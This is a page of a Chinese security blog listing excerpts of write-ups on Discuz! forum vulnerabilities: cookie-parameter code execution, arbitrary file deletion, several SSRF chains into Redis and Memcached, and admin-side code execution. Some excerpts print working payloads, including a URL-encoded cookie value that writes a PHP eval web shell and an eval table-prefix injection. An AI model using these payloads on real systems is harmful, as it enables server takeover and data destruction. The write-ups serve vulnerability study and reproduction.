<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/84/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Discuz/Discuz!ML 3.x 代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!ML%203.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:54.614Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-ML-3-x-代码执行漏洞"><a href="#Discuz-ML-3-x-代码执行漏洞" class="headerlink" title="Discuz!ML 3.x 代码执行漏洞"></a>Discuz!ML 3.x 代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞类型：代码执行漏洞漏洞原因：Discuz!ML<br>系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><ul>
<li>  Discuz!ML V3.2-3.4</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为</p>
<pre><code>xxxx_xxxx_language=sc&#39;.phpinfo().&#39;
</code></pre>
<p>getshell</p>
<pre><code>%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!ML%203.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!ML%203.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnsr0054y8v1abhrbos0" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 后台任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
  <time datetime="2022-07-08T06:25:54.611Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-后台任意文件删除"><a href="#Discuz-X3-4-后台任意文件删除" class="headerlink" title="Discuz! X3.4 后台任意文件删除"></a>Discuz! X3.4 后台任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>后台任意文件删除，需要有管理员的权限。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz!X V3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析一下该请求的流程。</p>
<p>请求URL：<code>/dz/upload/admin.php?action=forums&amp;operation=edit&amp;fid=2&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
<p>在<code>admin.php</code>中接收了action参数，在第58行经过<code>admincpfile</code>函数处理后返回文件路径，并包含该文件。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2qnsq0053y8v1ax5z25ny" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 前台ssrf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="article-date">
  <time datetime="2022-07-08T06:25:54.609Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-前台ssrf"><a href="#Discuz-X3-4-前台ssrf" class="headerlink" title="Discuz! X3.4 前台ssrf"></a>Discuz! X3.4 前台ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>DDiscuz! X3.4<br>source/module/misc/misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li><p>  &lt;= x3.4</p>
</li>
<li><p>  windows</p>
</li>
<li><p>  php&gt;5.3+php-curl&lt;=7.54</p>
</li>
<li><p>  DZ开放在80端口</p>
</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>本地ssrf</strong></p>
<p>/source/module/misc/misc_imgcropper.php 55行</p>
<pre><code>    require_once libfile(&#39;class/image&#39;);    $image = new image();   $prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;]; if(!$image-&gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) &#123;      showmessage(&#39;imagepreview_errorcode_&#39;.$image-&gt;errorcode, null, null, array(&#39;showdialog&#39; =&gt; true, &#39;closetime&#39; =&gt; true));    &#125;
$prefix`可以通过GET传递`$_GET[&#39;picflag&#39;]`为2进行三元操作，变成了默认的`/`，然后和`$_GET[&#39;cutimg&#39;]`进行拼接作为第一个参数传进了`$image-&gt;Thumb
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" data-id="cl5c2qnsq0052y8v151js4h1l" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 任意文件删除配合install过程getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" class="article-date">
  <time datetime="2022-07-08T06:25:54.607Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-任意文件删除配合install过程getshell"><a href="#Discuz-X3-4-任意文件删除配合install过程getshell" class="headerlink" title="Discuz! X3.4 任意文件删除配合install过程getshell"></a>Discuz! X3.4 任意文件删除配合install过程getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>**可以利用的条件：**1、安装后没有登录后台，此时install/index还没删除<br>2、因为其他原因没有删除</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz! X3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉<code>install.lock</code>文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。</p>
<p>表前缀：<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
<p>但是我在使用上面版本v3.4的代码时发现，安装后<code>install</code>目录下不存在<code>index.php</code>了。分析代码发现会有安装后的删除处理，在<code>/source/admincp/admincp_index.php</code>的第14行：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" data-id="cl5c2qnsp0050y8v1d2afgm4x" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 任意文件删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:54.605Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-任意文件删除漏洞"><a href="#Discuz-X3-4-任意文件删除漏洞" class="headerlink" title="Discuz! X3.4 任意文件删除漏洞"></a>Discuz! X3.4 任意文件删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>影响版本：Discuz!x ≤3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Discuz!X的码云已经更新修复了该漏洞</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574">https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574</a></p>
<p>核心问题在<code>upload/source/include/spacecp/spacecp_profile.php</code></p>
<p><img src="/resource/Discuz!X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnsp0051y8v1f3yrgtfg" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 Weixin Plugin ssrf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20Weixin%20Plugin%20ssrf/" class="article-date">
  <time datetime="2022-07-08T06:25:54.602Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-Weixin-Plugin-ssrf"><a href="#Discuz-X3-4-Weixin-Plugin-ssrf" class="headerlink" title="Discuz! X3.4 Weixin Plugin ssrf"></a>Discuz! X3.4 Weixin Plugin ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz! X3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><code>source/plugin/wechat/wechat.class.php</code> <code>WeChat</code>类<code>syncAvatar</code>方法：</p>
<pre><code>    static public function syncAvatar($uid, $avatar) &#123;

        if(!$uid || !$avatar) &#123;
            return false;
        &#125;

        if(!$content = dfsockopen($avatar)) &#123;
            return false;
        &#125;

        $tmpFile = DISCUZ_ROOT.&#39;./data/avatar/&#39;.TIMESTAMP.random(6);
        file_put_contents($tmpFile, $content);

        if(!is_file($tmpFile)) &#123;
            return false;
        &#125;

        $result = uploadUcAvatar::upload($uid, $tmpFile);
        unlink($tmpFile);

        C::t(&#39;common_member&#39;)-&gt;update($uid, array(&#39;avatarstatus&#39;=&gt;&#39;1&#39;));

        return $result;
    &#125;
</code></pre>
<p><code>source/plugin/wechat/wechat.inc.php</code><br>中调用了<code>WeChat::syncAvatar</code>，直接用<code>$_GET[&#39;avatar&#39;]</code>作为参数传进去：</p>
<pre><code>......

elseif(($ac == &#39;register&#39; &amp;&amp; submitcheck(&#39;submit&#39;) || $ac == &#39;wxregister&#39;) &amp;&amp; $_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_allowregister&#39;]) &#123;

        ......

        $uid = WeChat::register($_GET[&#39;username&#39;], $ac == &#39;wxregister&#39;);

        if($uid &amp;&amp; $_GET[&#39;avatar&#39;]) &#123;
            WeChat::syncAvatar($uid, $_GET[&#39;avatar&#39;]);
        &#125;

&#125;
</code></pre>
<p>不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20Weixin%20Plugin%20ssrf/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20Weixin%20Plugin%20ssrf/" data-id="cl5c2qnso004yy8v1fvrk54cb" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 ssrf 攻击redis" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20ssrf%20%E6%94%BB%E5%87%BBredis/" class="article-date">
  <time datetime="2022-07-08T06:25:54.600Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-ssrf-攻击redis"><a href="#Discuz-X3-4-ssrf-攻击redis" class="headerlink" title="Discuz! X3.4 ssrf 攻击redis"></a>Discuz! X3.4 ssrf 攻击redis</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要得到authkey</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz x3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>类似地，Dz 整合 Redis<br>配置成功后，默认情况下网站首页右下角会出现<code>Redis On</code>的标志：</p>
<p><img src="/resource/Discuz!X3.4ssrf%E6%94%BB%E5%87%BBredis/media/rId24.jpg"></p>
<p>SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua<br>脚本，可以直接用 lua<br>脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis<br>没有配置密码认证，Discuz requirepass 那一项为空：</p>
<p><img src="/resource/Discuz!X3.4ssrf%E6%94%BB%E5%87%BBredis/media/rId25.jpg"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20ssrf%20%E6%94%BB%E5%87%BBredis/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20ssrf%20%E6%94%BB%E5%87%BBredis/" data-id="cl5c2qnsn004xy8v1gm616qqx" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 Memcached未授权访问导致的rce" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="article-date">
  <time datetime="2022-07-08T06:25:54.598Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-Memcached未授权访问导致的rce"><a href="#Discuz-X3-4-Memcached未授权访问导致的rce" class="headerlink" title="Discuz! X3.4 Memcached未授权访问导致的rce"></a>Discuz! X3.4 Memcached未授权访问导致的rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>这个漏洞大致利用过程是这样的：利用discuz!的ssrf漏洞，利用gopher协议写入payload到memcached，然后请求特定链接导致代码执行漏洞。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li><p>  &lt;= x3.4</p>
</li>
<li><p>  windows</p>
</li>
<li><p>  php&gt;5.3+php-curl&lt;=7.54</p>
</li>
<li><p>  DZ开放在80端口</p>
</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Dz 整合 Memcache<br>配置成功后，默认情况下网站首页右下角会出现<code>MemCache On</code>的标志：</p>
<p><img src="/resource/Discuz!X3.4Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/media/rId25.jpg"></p>
<p>漏洞利用有两个版本，一个是老版本，一个是新版本，discuz！虽然已经是x3.4，代码也发生了变化，漏洞确是任然没有修复。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" data-id="cl5c2qnsm004vy8v1bgnrh6to" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.4 imgcropper ssrf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20imgcropper%20ssrf/" class="article-date">
  <time datetime="2022-07-08T06:25:54.596Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-4-imgcropper-ssrf"><a href="#Discuz-X3-4-imgcropper-ssrf" class="headerlink" title="Discuz! X3.4 imgcropper ssrf"></a>Discuz! X3.4 imgcropper ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host<br>的请求，总的来说比较鸡肋</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><code>source/class/class_image.php</code> <code>image</code>类<code>init</code>方法：</p>
<pre><code>    function init($method, $source, $target, $nosuffix = 0) &#123;
        global $_G;

        $this-&gt;errorcode = 0;
        if(empty($source)) &#123;
            return -2;
        &#125;
        $parse = parse_url($source);
        if(isset($parse[&#39;host&#39;])) &#123;
            if(empty($target)) &#123;
                return -2;
            &#125;
            $data = dfsockopen($source);
            $this-&gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);
            if(!$data || $source === FALSE) &#123;
                return -2;
            &#125;
            file_put_contents($source, $data);
        &#125;
        ......
  &#125;
</code></pre>
<p>再找哪些地方调用了<code>image</code>类的<code>init</code>方法，发现<code>image</code>类的<code>Thumb</code>、<code>Cropper</code>、<code>Watermark</code>方法都调用了<code>init</code>。比如<code>Thumb</code>：</p>
<pre><code>    function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) &#123;
        $return = $this-&gt;init(&#39;thumb&#39;, $source, $target, $nosuffix);
        ......
    &#125;
</code></pre>
<p>所以再找哪些地方调用了<code>image</code>类的<code>Thumb</code>方法，最终发现：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20imgcropper%20ssrf/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20imgcropper%20ssrf/" data-id="cl5c2qnso004zy8v1hm0xanjp" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Discuz/Discuz! X3.1 后台任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Discuz/Discuz!%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:54.593Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Discuz-X3-1-后台任意代码执行漏洞"><a href="#Discuz-X3-1-后台任意代码执行漏洞" class="headerlink" title="Discuz! X3.1 后台任意代码执行漏洞"></a>Discuz! X3.1 后台任意代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz! X3.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
<li><p>  全局--〉网站第三方统计代码--〉插入php代码[其他地方&lt;&gt;会被转意]：    如插入    007uCUf6ly1fxlneom4cfj30om0l40vg.jpg</p>
</li>
<li><p>  工具--〉更新缓存[为了保险起见，更新下系统缓存]：    2.jpg</p>
</li>
<li><p>  门户--&gt; HTML管理--〉设置：</p>
</li>
</ul>
<p>1） 静态文件扩展名[一定要设置成htm] ：htm2) 专题HTML存放目录: template/default/portal3) 设置完，提交吧！</p>
<p>3.jpg</p>
<ul>
<li>  门户--〉专题管理--〉创建专题：</li>
</ul>
<p>1）专题标题：xyz // 这个随便你写了2）静态化名称：portal_topic_222 //222为自定义文件名，自己要记住3）附加内容：选择上： 站点尾部信息</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Discuz/Discuz!%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnsm004wy8v1dnib8lng" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/83/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/82/">82</a><a class="page-number" href="/page/83/">83</a><span class="page-number current">84</span><a class="page-number" href="/page/85/">85</a><a class="page-number" href="/page/86/">86</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/85/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
